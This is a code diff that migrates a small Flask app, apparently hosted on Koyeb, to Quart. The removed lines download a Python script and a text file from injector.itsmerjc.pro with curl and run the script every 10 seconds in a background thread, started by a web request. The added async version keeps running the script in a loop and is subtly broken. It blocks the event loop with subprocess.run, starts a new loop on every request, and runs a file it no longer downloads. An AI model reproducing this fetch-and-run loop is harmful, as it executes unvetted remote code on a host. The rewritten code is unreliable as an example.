@@ -1,31 +1,18 @@
-from flask import Flask
+from quart import Quart
 import subprocess
-import threading
-import time
+import asyncio
 
-app = Flask(__name__)
+app = Quart(__name__)
 
-def download_and_run_script():
+async def run_script_loop():
     while True:
-        # Download the Python script using curl
-        subprocess.run(['curl', '-O', 'https://injector.itsmerjc.pro/itsmerjc.py'])
-        subprocess.run(['curl', '-O', 'https://injector.itsmerjc.pro/kido.txt'])
-        
-        # Run the downloaded Python script
         subprocess.run(['python', 'itsmerjc.py'])
-        
-        # Prevent tight looping, run the script every 10 seconds (adjust as needed)
-        time.sleep(10)
+        await asyncio.sleep(10)  # Async-friendly sleep
 
 @app.route('/')
-def hello_world():
-    # Start the background task to download and run the script, if not already running
-    if not any(thread.name == "ScriptThread" for thread in threading.enumerate()):
-        thread = threading.Thread(target=download_and_run_script, name="ScriptThread")
-        thread.daemon = True  # Allows thread to exit when the main program exits
-        thread.start()
-
-    return 'Script downloading and running in the background. Hello from Koyeb!'
+async def hello_world():
+    asyncio.create_task(run_script_loop())  # Run loop in the background
+    return 'Script running in the background. Hello from Koyeb!'
 
 if __name__ == "__main__":
     app.run()
